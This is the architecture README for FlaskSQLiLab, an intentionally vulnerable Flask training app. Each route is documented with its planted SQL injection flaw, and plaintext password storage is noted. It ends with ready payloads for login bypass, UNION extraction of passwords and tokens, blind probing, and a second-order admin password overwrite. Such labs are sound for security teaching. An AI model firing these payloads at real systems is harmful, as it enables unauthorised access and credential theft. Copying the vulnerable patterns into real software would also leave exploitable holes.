# FlaskSQLiLab Architecture and Logic Explanation

**Built and created by [Meni](https://x.com/MeniTasa) – Cybersecurity Lead | 🛡️ CISO | ☁️ CloudSec | 🌐 NetSec (CCNP) | 🔍 Web Pentester | ✍️ Writer**

---

## 🔷 Application Overview

**FlaskSQLiLab** is an intentionally vulnerable Flask web application explicitly built to educate users about web security vulnerabilities. It demonstrates various SQL injection methods, cookie manipulation, session handling, and JSON API interactions.

---

## 🛠️ Application Architecture

```plaintext
FlaskSQLiLab/
├── app.py                   # Flask backend logic
├── schema.sql               # Database schema setup
├── users.db                 # SQLite database
├── requirements.txt         # Python dependencies
├── static/
│   └── style.css            # CSS stylesheets
├── templates/               # HTML templates
│   ├── login.html
│   ├── register.html
│   ├── dashboard.html
│   ├── search.html
│   ├── check_user.html
│   └── update_profile.html
└── venv/                    # Python virtual environment
```

---

## 🔷 Backend Logic & Workflow

### **Main Application (`app.py`)**

- Handles routes, session management, cookies, JSON responses, and database interactions.
- Vulnerabilities explicitly included for SQL injection practice.

### **Database (SQLite)**

- A single SQLite database (`users.db`) contains the `users` table storing:
  - Usernames (`username`)
  - Passwords (`password`) stored explicitly in plaintext
  - Cookie tokens (`remember_token`) stored unsafely for educational purposes

### **Session and Cookie Management**

- Flask’s session management tracks logged-in users.
- Cookies (`remember_me`) store usernames directly, enabling explicit cookie-based SQL injection demonstrations.

---

## 📌 Endpoint Logic and Vulnerabilities Explained

### **`/` (Login)**

- Vulnerability: **Error-based SQL Injection**
- Authentication bypass via unsanitized SQL queries.
- Sets cookies and sessions explicitly.

### **`/register`**

- Vulnerability: **Error-based SQL Injection**
- Registers users unsafely via user input directly into database.

### **`/dashboard`**

- Vulnerability: **Cookie-based SQL Injection**
- Uses cookies explicitly in SQL queries, vulnerable to injection.

### **`/search` (JSON Response)**

- Vulnerability: **Error-based SQL Injection**
- Returns structured JSON user data vulnerable to injection payloads.

### **`/profile/<username>` (JSON Response)**

- Vulnerability: **UNION-based SQL Injection**
- Explicitly provides JSON user data extraction via SQL injection.

### **`/check_user` (JSON Response)**

- Vulnerability: **Blind SQL Injection (Boolean and Time-based)**
- Allows clear user enumeration and data extraction via structured JSON responses.

### **`/update_profile` (JSON Response)**

- Vulnerability: **Second-order SQL Injection**
- Unsafely updates profile data based on unsanitized input.
- Clearly returns structured JSON indicating success or error.

### **`/session-info` (JSON Response)**

- Demonstrates session and cookie data explicitly in JSON format.
- Useful for understanding cookie manipulation and session hijacking.

---

## 🔐 Encryption and Security Practices (Educational Context)

- **Encryption:**  
  No encryption implemented explicitly to demonstrate vulnerabilities clearly.
- **Passwords:**  
  Stored in plaintext explicitly for educational demonstrations.

- **Cookies & Tokens:**  
  Intentionally insecure (plaintext storage and direct DB usage) to facilitate clear demonstrations of vulnerabilities.

---

## 🎯 Educational Usage & Ethical Guidelines

**FlaskSQLiLab** is explicitly designed for:

- Learning and demonstrating web application vulnerabilities.
- Practicing SQL injection in a controlled, isolated environment.
- Demonstrating real-world exploitation clearly and practically.

**Ethical Reminders:**

- **Never deploy publicly.**
- Use strictly for educational purposes.
- Follow ethical and legal standards during testing.

---

## 🚩 Practical SQL Injection Examples

- **Authentication bypass (Login):**

```sql
admin' OR '1'='1' --
```

- **Data extraction (`/search`):**

```sql
%' OR '1'='1' --
```

- **UNION-based data extraction (`/profile/<username>`):**

```
admin' UNION SELECT id,username,password,remember_token FROM users --
```

- **Blind SQL Injection (`/check_user`):**

```sql
admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
```

- **Second-order Injection (`/update_profile`):**

```sql
attacker', password='hacked' WHERE username='admin' --
```

---

**Happy Hacking & Learning!**
